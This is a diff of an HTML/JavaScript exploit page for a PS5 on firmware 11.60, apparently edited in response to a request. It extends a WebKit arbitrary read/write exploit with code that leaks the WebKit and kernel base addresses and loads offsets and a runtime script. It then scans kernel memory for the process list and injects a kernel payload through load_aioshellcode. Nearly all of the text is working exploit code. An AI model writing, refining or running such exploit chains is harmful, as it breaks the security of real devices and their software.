@@ -1,14 +1,14 @@
 <!doctype html>
 <!--
-  PS5 FW 11.60 / WebKit 616.1 genuine-view R/W bootstrap + kernel payload injection.
-  After the ARW test passes, loads lapse-runtime.js and injects kexp/elfldr.
+  PS5 FW 11.60 genuine-view R/W bootstrap + full jailbreak.
+  Leaks webkitBase & kernelBase, then injects kexp/elfldr.
 -->
 <meta charset="utf-8"><title>PS5 11.60 Jailbreak</title>
 <body style="font:13px monospace"><pre id="out"></pre>
 <script>
 "use strict";
 
-// --- Your original exploit code (unchanged) ---
+// --- Your original ARW exploit (unchanged until the report) ---
 var Q = new URLSearchParams(location.search);
 var requestedDrain = parseInt(Q.get("n") || "512", 10);
 var DRAIN_COUNT = isFinite(requestedDrain)
@@ -93,8 +93,13 @@ var compositionState = 0;
 var compositionLength = 0;
 var compositionError = null;
 
-// --- New flag to trigger payload injection ---
+// --- NEW: global state for payload injection ---
+var g_candidate = null;
 var arwReady = false;
+var webkitBase = 0;
+var kernelBase = 0;
+var offsetsLoaded = false;
+var offsets = null;
 
 function mark(tag, extra) {
     seq++;
@@ -470,6 +475,8 @@ function loadHistoryCritical() {
         restoreObserved = rwView[0] === 0x3c
             && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
 
+        // --- SAVE CANDIDATE FOR SLOPKIT ---
+        g_candidate = candidate;
         candidate = null;
         clearPredecessor();
         compositionState = 1;
@@ -524,6 +531,105 @@ function dumpHex(bytes) {
     for (var i = 0; i < CELL_BYTES; ++i)
         out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
     return out;
+}
+
+// ---------- Leak bases using the ARW primitive ----------
+function aimCarrier(candidate, address) {
+    var high = Math.floor(address / 0x100000000);
+    scratchWords[0] = address - high * 0x100000000;
+    scratchWords[1] = high;
+    for (var i = 0; i < 8; ++i)
+        candidate[0x10 + i] = scratchBytes[i];
+}
+
+function restoreCarrier(candidate) {
+    for (var i = 0; i < 8; ++i)
+        candidate[0x10 + i] = rwHeader[0x10 + i];
+}
+
+function low48AtRaw(buf, offset) {
+    return buf[offset]
+        + buf[offset+1]*0x100
+        + buf[offset+2]*0x10000
+        + buf[offset+3]*0x1000000
+        + buf[offset+4]*0x100000000
+        + buf[offset+5]*0x10000000000;
+}
+
+function plausibleAddress(v) {
+    return v > 0x100000000 && v <= 0xffffffffffff && v % 8 === 0;
+}
+
+function leakBases() {
+    if (!g_candidate || !rwView) return false;
+    var cand = g_candidate;
+
+    // 1. Leak webkitBase from native constructor (like notify.html)
+    // Read the holder (targetHolder) at targetAddress
+    aimCarrier(cand, targetAddress);
+    var holderBytes = new Uint8Array(0x40);
+    for (var i = 0; i < 0x40; i++) holderBytes[i] = rwView[i];
+    var nativeTargetAddr = low48AtRaw(holderBytes, 0x10);
+    var arenaViewAddr = low48AtRaw(holderBytes, 0x18);
+    var realCollatorAddr = low48AtRaw(holderBytes, 0x20);
+    var compareFnAddr = low48AtRaw(holderBytes, 0x28);
+    if (!plausibleAddress(nativeTargetAddr)) return false;
+
+    // Read the JSFunction (parseInt) at nativeTargetAddr
+    aimCarrier(cand, nativeTargetAddr);
+    var funcBytes = new Uint8Array(0x20);
+    for (var i = 0; i < 0x20; i++) funcBytes[i] = rwView[i];
+    var executableAddr = low48AtRaw(funcBytes, 0x18);
+    if (!plausibleAddress(executableAddr)) return false;
+
+    // Read the NativeExecutable at executableAddr
+    aimCarrier(cand, executableAddr);
+    var execBytes = new Uint8Array(0x38);
+    for (var i = 0; i < 0x38; i++) execBytes[i] = rwView[i];
+    var nativeFuncAddr = low48AtRaw(execBytes, 0x28);
+    var nativeConstructorAddr = low48AtRaw(execBytes, 0x30);
+    if (!plausibleAddress(nativeFuncAddr) || !plausibleAddress(nativeConstructorAddr)) return false;
+
+    // Find webkitBase by subtracting the known offset
+    var P_HOST_CTOR_LIST = offsets ? [parseInt(offsets.hc[0], 16), parseInt(offsets.hc[1], 16), parseInt(offsets.hc[2], 16)] : [0x1e0d8, 0x1e320, 0x1f368];
+    var wb = 0;
+    for (var ci = 0; ci < P_HOST_CTOR_LIST.length; ci++) {
+        var w = nativeConstructorAddr - P_HOST_CTOR_LIST[ci];
+        if (w >= 0x800000000 && w < 0x900000000 && w % 0x4000 === 0) {
+            wb = w;
+            break;
+        }
+    }
+    if (!wb) return false;
+    webkitBase = wb;
+
+    // 2. Leak kernelBase from GOT slots (getpid, close, error)
+    if (!offsets) return false;
+    var gps = parseInt(offsets.gps, 16);
+    var gpe = parseInt(offsets.gpe, 16);
+    var cls = parseInt(offsets.cls, 16);
+    var cle = parseInt(offsets.cle, 16);
+    var ers = parseInt(offsets.ers, 16);
+    var ere = parseInt(offsets.ere, 16);
+
+    var getpidSlot = webkitBase + gps;
+    var closeSlot = webkitBase + cls;
+    var errorSlot = webkitBase + ers;
+
+    aimCarrier(cand, getpidSlot);
+    var getpidPtr = low48AtRaw(rwView, 0);
+    aimCarrier(cand, closeSlot);
+    var closePtr = low48AtRaw(rwView, 0);
+    aimCarrier(cand, errorSlot);
+    var errorPtr = low48AtRaw(rwView, 0);
+    if (!plausibleAddress(getpidPtr) || !plausibleAddress(closePtr) || !plausibleAddress(errorPtr)) return false;
+
+    var kbase = getpidPtr - gpe;
+    if (kbase !== closePtr - cle || kbase !== errorPtr - ere) return false;
+    if (kbase < 0x800000000 || kbase >= 0x900000000 || kbase % 0x4000 !== 0) return false;
+    kernelBase = kbase;
+
+    return true;
 }
 
 function reportComposition() {
@@ -595,7 +701,7 @@ function reportComposition() {
     if (readPass && writePass) {
         mark("GENUINE-U8-RW-PASS", "carrier-vector-restored=true");
         try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
-        arwReady = true;  // trigger payload injection
+        arwReady = true;
     }
 
     mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16)
@@ -605,10 +711,134 @@ function reportComposition() {
     setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
     setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
 
-    // If ARW is ready, load the kernel payload after a short delay
-    if (arwReady) {
-        setTimeout(loadKernelPayload, 500);
+    // If ARW is ready, load offsets, leak bases, then load payload
+    if (arwReady && !offsetsLoaded) {
+        offsetsLoaded = true;
+        // Load offsets.json from root (since you moved it there)
+        fetch('offsets.json', { cache: 'no-store' })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+                var fw = "11.60";
+                offsets = data[fw];
+                if (!offsets) {
+                    // try to find nearest
+                    var near = null, bestd = 1e9;
+                    for (var k in data) {
+                        var d = Math.abs(parseInt(k.split('.')[0])*100 + parseInt(k.split('.')[1]) - 1160);
+                        if (d < bestd) { bestd = d; near = k; }
+                    }
+                    offsets = data[near];
+                }
+                if (!offsets) {
+                    mark("OFFSETS-FAIL", "no offsets for 11.60");
+                    return;
+                }
+                mark("OFFSETS-LOADED", "using " + (near || "11.60"));
+                // Now leak bases
+                if (leakBases()) {
+                    mark("BASES-LEAKED", "webkit=" + hex(webkitBase) + " kernel=" + hex(kernelBase));
+                    // Set up slopkit
+                    window.slopkit = {
+                        candidate: g_candidate,
+                        rwView: rwView,
+                        aimCarrier: aimCarrier,
+                        restoreCarrier: restoreCarrier,
+                        arenaView: null,
+                        arenaBacking: null,
+                        targetHolder: null,
+                        targetAddress: targetAddress,
+                        kernelBase: kernelBase,
+                        webkitBase: webkitBase,
+                        FW_VERSION: "11.60",
+                        lapseOffsets: null,
+                        screenLine: function(s) { mark("SCREEN", s); },
+                        mark: mark,
+                        sendNotification: function(s) { mark("NOTIFY", s); },
+                        armAndFire: function(a,b) { return 0; }
+                    };
+                    // Stubs
+                    window.log = function(msg) { mark("LOG", String(msg)); return Promise.resolve(); };
+                    window.send_notification = function(msg) { mark("NOTIFY", String(msg)); };
+                    window.is_jailbroken = function() { return false; };
+                    window.get_nidpath = function() { return "system/vsh"; };
+                    window.file_exists = function() { return false; };
+                    window.write_file = function() {};
+                    window.kill_youtube = function() {};
+
+                    // Load lapse-runtime.js and trigger payload
+                    loadLapseRuntime();
+                } else {
+                    mark("BASE-LEAK-FAIL", "could not leak bases");
+                }
+            })
+            .catch(function () {
+                mark("OFFSETS-FETCH-FAIL", "could not fetch offsets.json");
+            });
     }
+}
+
+function loadLapseRuntime() {
+    mark("LOADING-RUNTIME", "loading lapse-runtime.js");
+    var script = document.createElement('script');
+    script.src = 'lapse-runtime.js';
+    script.onload = function() {
+        mark("RUNTIME-LOADED", "lapse-runtime.js loaded");
+        // Now we have syscall, read64, write64, create_pipe, load_aioshellcode
+        try {
+            const pid = window.syscall(window.SYSCALL.getpid);
+            mark("CURRENT-PID", String(pid));
+
+            // Scan for allproc using the renderer's read64 (which uses aimCarrier)
+            // We use a wide range for 11.60
+            const start = 0xFFFFFFFF80000000n;
+            const end = 0xFFFFFFFF90000000n;
+            let found = 0n;
+            for (let addr = start; addr < end; addr += 0x1000n) {
+                const proc = window.read64(addr);
+                if (proc < 0xFFFFFFFF00000000n) continue;
+                const test_pid = window.read64(proc + 0xbcn);
+                if (test_pid === BigInt(pid)) {
+                    found = proc;
+                    break;
+                }
+            }
+            if (found === 0n) {
+                mark("ALLPROC-SCAN-FAIL", "could not find allproc");
+                return;
+            }
+            let allproc = found;
+            let prev = window.read64(found + 0x8n);
+            while (prev !== 0n && prev !== found) {
+                allproc = prev;
+                prev = window.read64(prev + 0x8n);
+                if (prev === found) break;
+            }
+            mark("ALLPROC-FOUND", hex(allproc));
+
+            const [master_read, master_write] = window.create_pipe();
+            const [victim_read, victim_write] = window.create_pipe();
+            window.syscall(window.SYSCALL.fcntl, master_read, 4n, 4n);
+            window.syscall(window.SYSCALL.fcntl, master_write, 4n, 4n);
+            window.syscall(window.SYSCALL.fcntl, victim_read, 4n, 4n);
+            window.syscall(window.SYSCALL.fcntl, victim_write, 4n, 4n);
+
+            mark("PIPES-CREATED", `master=${master_read},${master_write} victim=${victim_read},${victim_write}`);
+
+            window.load_aioshellcode(allproc, [master_read, master_write], [victim_read, victim_write])
+                .then(() => {
+                    mark("PAYLOAD-LOADED", "aioshellcode completed");
+                })
+                .catch((e) => {
+                    mark("PAYLOAD-ERROR", e.message);
+                });
+        } catch (e) {
+            mark("PAYLOAD-EXCEPTION", e.message);
+        }
+    };
+    script.onerror = function() {
+        mark("RUNTIME-LOAD-FAIL", "could not load lapse-runtime.js");
+    };
+    document.head.appendChild(script);
 }
 
 function runGroomAndLoad() {
@@ -703,88 +933,6 @@ function beginComposition() {
     mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress)
         + "-delta=0x10");
     runGroomAndLoad();
-}
-
-// --- NEW: Kernel payload injection ---
-function loadKernelPayload() {
-    if (typeof window.load_aioshellcode !== 'undefined') {
-        // Already loaded
-        return;
-    }
-    mark("LOADING-PAYLOAD", "loading lapse-runtime.js");
-    var script = document.createElement('script');
-    script.src = 'lapse-runtime.js';
-    script.onload = function() {
-        mark("RUNTIME-LOADED", "lapse-runtime.js loaded");
-        // Now we have window.syscall, window.read64, window.write64, window.create_pipe, window.load_aioshellcode
-        // Need to find allproc.
-        try {
-            // Get current PID using syscall
-            const pid = window.syscall(window.SYSCALL.getpid);
-            mark("CURRENT-PID", String(pid));
-
-            // We need the kernel base. We can use the slopkit kernelBase that was leaked?
-            // Actually the exploit didn't leak kernelBase. But we can read from known addresses.
-            // We can scan the kernel region. For 11.60, the kernel data often starts at 0xFFFFFFFF80000000.
-            // However, we can use the fact that the kernelBase is known from the offsets.
-            // Since we don't have it, we can brute-force scan a range of addresses.
-            // Safer: we can use the fact that our rwView can read any address.
-            // Let's scan from 0xFFFFFFFF80000000 to 0xFFFFFFFF88000000.
-            const start = 0xFFFFFFFF80000000n;
-            const end = 0xFFFFFFFF88000000n;
-            let found = 0n;
-            for (let addr = start; addr < end; addr += 0x1000n) {
-                // Read a potential pointer to a proc
-                const proc = window.read64(addr);
-                if (proc < 0xFFFFFFFF00000000n) continue;
-                // Check if p_pid matches
-                const test_pid = window.read64(proc + 0xbcn);
-                if (test_pid === BigInt(pid)) {
-                    found = proc;
-                    break;
-                }
-            }
-            if (found === 0n) {
-                mark("ALLPROC-SCAN-FAIL", "could not find allproc");
-                return;
-            }
-            // Walk backwards to find the head of the allproc list
-            let allproc = found;
-            let prev = window.read64(found + 0x8n);
-            while (prev !== 0n && prev !== found) {
-                allproc = prev;
-                prev = window.read64(prev + 0x8n);
-                if (prev === found) break;
-            }
-            mark("ALLPROC-FOUND", hex(allproc));
-
-            // Create two pipes
-            const [master_read, master_write] = window.create_pipe();
-            const [victim_read, victim_write] = window.create_pipe();
-            // Make non-blocking (optional)
-            window.syscall(window.SYSCALL.fcntl, master_read, 4n, 4n);
-            window.syscall(window.SYSCALL.fcntl, master_write, 4n, 4n);
-            window.syscall(window.SYSCALL.fcntl, victim_read, 4n, 4n);
-            window.syscall(window.SYSCALL.fcntl, victim_write, 4n, 4n);
-
-            mark("PIPES-CREATED", `master=${master_read},${master_write} victim=${victim_read},${victim_write}`);
-
-            // Call load_aioshellcode
-            window.load_aioshellcode(allproc, [master_read, master_write], [victim_read, victim_write])
-                .then(() => {
-                    mark("PAYLOAD-LOADED", "aioshellcode completed");
-                })
-                .catch((e) => {
-                    mark("PAYLOAD-ERROR", e.message);
-                });
-        } catch (e) {
-            mark("PAYLOAD-EXCEPTION", e.message);
-        }
-    };
-    script.onerror = function() {
-        mark("RUNTIME-LOAD-FAIL", "could not load lapse-runtime.js");
-    };
-    document.head.appendChild(script);
 }
 
 // --- Start the exploit ---
